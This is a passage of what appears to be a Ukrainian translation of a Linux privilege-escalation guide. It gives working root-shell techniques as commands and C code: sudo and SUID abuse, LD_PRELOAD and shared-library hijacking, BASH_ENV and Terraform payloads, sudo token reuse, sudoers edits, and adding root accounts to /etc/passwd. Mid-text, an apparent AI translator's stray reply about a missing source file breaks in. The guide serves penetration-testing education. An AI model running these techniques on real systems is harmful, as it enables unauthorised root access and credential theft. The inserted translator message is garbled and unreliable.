<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як перераховувати та експлуатувати D-Bus комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво дослідити мережу та визначити розташування машини.

### Загальна енумерація
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете перехопити деякі облікові дані.
```
timeout 1 tcpdump
```
## Користувачі

### Generic Enumeration

Перевірте **хто** ви, які **привілеї** у вас є, які **користувачі** є в системах, які з них можуть **login** і які мають **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux постраждали від бага, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якоїсь групи**, яка могла б надати вам привілеї root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вам не заважає створювати багато шуму і бінарні файли `su` та `timeout` присутні на комп'ютері, ви можете спробувати brute-force користувача, використовуючи [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записними папками в $PATH

### $PATH

Якщо ви виявите, що можете **записувати всередину якоїсь папки з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записній папці** з ім'ям якоїсь команди, яка буде виконана іншим користувачем (ідеально — root), і яка **не завантажується з папки, що знаходиться перед** вашою записною папкою в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду за допомогою sudo, або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволяти користувачеві виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер отримати shell дуже просто — додавши ssh key до директорії root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **set an environment variable** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking** для завантаження довільної python бібліотеки під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете використати неінтерактивну поведінку запуску Bash, щоб виконати довільний код від імені root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних shell Bash оцінює `$BASH_ENV` і sources (підключає) цей файл перед виконанням цільового скрипта. Багато sudo-правил дозволяють запуск скрипта або оболонки-обгортки. Якщо `BASH_ENV` зберігається sudo, ваш файл підключається з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірити командою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell-обгорток для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
- Розгляньте sudo I/O логування та оповіщення при використанні збережених env vars.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo залишає середовище незмінним (`!env_reset`) одночасно дозволяючи `terraform apply`, `$HOME` залишається від користувача, який викликав команду. Тому Terraform завантажує **$HOME/.terraformrc** під root і враховує `provider_installation.dev_overrides`.

- Вкажіть потрібний provider на каталог, доступний для запису, і розмістіть шкідливий плагін з ім'ям провайдера (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде Go plugin handshake, але виконає payload від імені root перед тим, як завершитись, залишаючи SUID shell.

### TF_VAR overrides + symlink validation bypass

Змінні Terraform можна передати через змінні середовища `TF_VAR_<name>`, які зберігаються, якщо sudo зберігає оточення. Слабкі перевірки, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **записувати** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.

- Вимоги: правило sudo (часто `NOPASSWD`), що запускає скрипт/бінар, який викликає команди без абсолютних шляхів (`free`, `df`, `ps`, тощо) та директорія в PATH, доступна для запису і яка перевіряється першою.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo — шляхи обходу виконання
**Перейдіть**, щоб прочитати інші файли або використати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказання шляху до команди

Якщо користувачу надано **sudo permission** для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ ви можете експлуатувати це, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використати, якщо **suid** бінарний файл **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст підозрілого SUID бінарного файлу)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл з шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **export a function**, назвавши її як команду, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_ вам потрібно спробувати створити функцію і експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або декількох спільних бібліотек (.so files), які завантажуються завантажувачем перед усіма іншими, включно зі стандартною бібліотекою C (`libc.so`). Цей процес відомий як передзавантаження бібліотеки.

Однак для підтримки безпеки системи та запобігання зловживанню цією можливістю, особливо щодо **suid/sgid** виконуваних файлів, система застосовує певні обмеження:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів зі suid/sgid передзавантажуються лише бібліотеки в стандартних шляхах, які також мають suid/sgid.

Ескалація привілеїв може трапитися, якщо ви маєте можливість виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися й враховуватися навіть під час виконання команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** запустивши
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо зловмисник контролює **LD_LIBRARY_PATH** змінну оточення, оскільки він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Якщо ви натрапили на бінарний файл з правами **SUID**, який виглядає незвично, варто перевірити, чи він правильно завантажує **.so** файли. Для цього виконайте таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість для exploit.

Щоб exploit цього, слід створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищення привілеїв шляхом маніпулювання дозволами файлів та запуску shell з підвищеними привілеями.

Скомпілюйте вищевказаний C-файл у спільну бібліотеку (.so) за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID бінарного файлу має викликати exploit, що дозволяє потенційну компрометацію системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує library з folder, у який ми можемо write, створімо library у цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована бібліотека повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це курований список Unix-бінарників, які можуть бути використані нападником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **only inject arguments** у команду.

Проект збирає легітимні функції Unix-бінарників, які можна зловживати, щоб вийти з обмежених shells, ескалювати або підтримувати підвищені привілеї, передавати файли, spawn bind and reverse shells і полегшувати інші post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви можете виконати `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете ескалювати привілеї, дочекавшись виконання sudo-команди і потім перехопивши токен сесії.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell від імені користувача "_sampleuser_"
- "_sampleuser_" використовував **`sudo`** для виконання чогось в **останні 15 хвилин** (за замовчуванням це тривалість sudo-токена, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви зможете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці умови виконані, **ви можете ескалювати привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший **експлоїт** (`exploit.sh`) створить бінарний файл `activate_sudo_token` в _/tmp_. Ви можете використати його, щоб **activate the sudo token in your session** (ви не отримаєте автоматично root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers file**, який зробить **sudo tokens вічними та дозволить усім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/<Username>

Якщо ви маєте **права запису** у папці або на будь-який із створених у ній файлів, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і у вас є shell від імені цього користувача з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл — ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Є альтернативи бінарнику `sudo`, наприклад `doas` для OpenBSD — перевірте його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для ескалації привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo executable**, який виконає ваш код як root, а потім команду користувача. Далі **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб, коли користувач виконає sudo, виконувся ваш sudo executable.

Зауважте, що якщо користувач використовує інший shell (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад [sudo-piggyback](https://github.com/APTy/sudo-piggyback) модифікує `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться конфігураційні файли, що завантажуються**. Зазвичай цей файл містить наступний запис: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, в яких будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки всередині `/usr/local/lib`.**

Якщо з якоїсь причини **користувач має права на запис** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якому файлі всередині `/etc/ld.so.conf.d/` або будь-якій папці, вказаній у конфігураційному файлі `/etc/ld.so.conf.d/*.conf` він може отримати підвищені привілеї.\
Дивіться **як експлуатувати цю помилку в конфігурації** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіювання lib у `/var/tmp/flag15/` призведе до того, що вона буде використана програмою в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **підмножину доступних root-привілеїв процесу**. Це фактично розбиває root **привілеї на менші та відмінні одиниці**. Кожну з цих одиниць можна окремо надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорій

У директорії **біт "execute"** означає, що відповідний користувач може **"cd"** у папку.\
**"read"** біт означає, що користувач може **list** **files**, а **"write"** біт означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють вторинний рівень дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx дозволи**. Ці дозволи покращують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Така ступінь **дрібнозернистості забезпечує більш точне керування доступом**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" права читання та запису для файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **old versions** ви можете **hijack** деяку **shell** session іншого користувача (**root**).\
У **newest versions** ви зможете **connect** лише до screen sessions вашого власного користувача. Однак ви можете знайти **цікаву інформацію всередині session**.

### screen sessions hijacking

**Перегляд screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Я не зміг перехопити сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Перелічити сесії tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Всі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu, тощо) між вереснем 2006 і 13 травня 2008 року можуть бути уражені цим багом.\
Цей баг виникає під час створення нового ssh ключа в цих ОС, оскільки **було можливих лише 32,768 варіацій**. Це означає, що всі варіанти можна обчислити і **маючи ssh public key ви можете шукати відповідний приватний ключ**. Розраховані варіанти можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Цікаві параметри конфігурації

- **PasswordAuthentication:** Вказує, чи дозволена автентифікація за паролем. За замовчуванням `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена автентифікація за допомогою публічного ключа. За замовчуванням `yes`.
- **PermitEmptyPasswords**: Коли автентифікація за паролем дозволена, вказує, чи дозволяє сервер вхід в акаунти з порожніми рядками пароля. За замовчуванням `no`.

### PermitRootLogin

Вказує, чи може root входити через ssh; за замовчуванням `no`. Можливі значення:

- `yes`: root може входити за допомогою пароля та приватного ключа
- `without-password` або `prohibit-password`: root може входити лише за допомогою приватного ключа
- `forced-commands-only`: root може входити лише за допомогою приватного ключа і якщо вказані опції команд
- `no` : заборонено

### AuthorizedKeysFile

Вказує файли, що містять публічні ключі, які можуть використовуватися для автентифікації користувача. Вони можуть містити токени на кшталт `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти, використовуючи **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що розташовані в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) які залишаються на вашому сервері. Отже, ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** located in your **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` — `*`, щоразу, коли користувач підключається до іншої машини, той хост зможе отримати доступ до keys (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписувати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, перегляньте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в директорії `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає новий shell**. Тому, якщо ви можете **записати або змінити будь-який з них — you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь дивний скрипт профілю, слід перевірити його на наявність **чутливих даних**.

### Файли passwd/shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати їхні резервні копії. Тому рекомендовано **знайти всі** та **перевірити, чи можна їх прочитати**, щоб дізнатися **чи є в них хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді ви можете знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Я не бачу вхідного вмісту файлу src/linux-hardening/privilege-escalation/README.md. Будь ласка, вставте вміст файлу, який потрібно перекласти, або підтвердіть, що мені можна додати новий розділ у файл із командами для створення користувача hacker і згенерованим паролем.

Крім того, уточніть:
- Чи потрібно, щоб згенерований пароль був явним у перекладі (включений у файл як plain text)?
- Чи бажаєте конкретний формат для додаткового розділу (наприклад, блок команд shell)?

Після отримання файлу або підтвердження я виконую переклад згідно з вашими вказівками і додам створення користувача hacker з згенерованим паролем.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Альтернативно, ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На BSD-платформах `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Перевірте, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
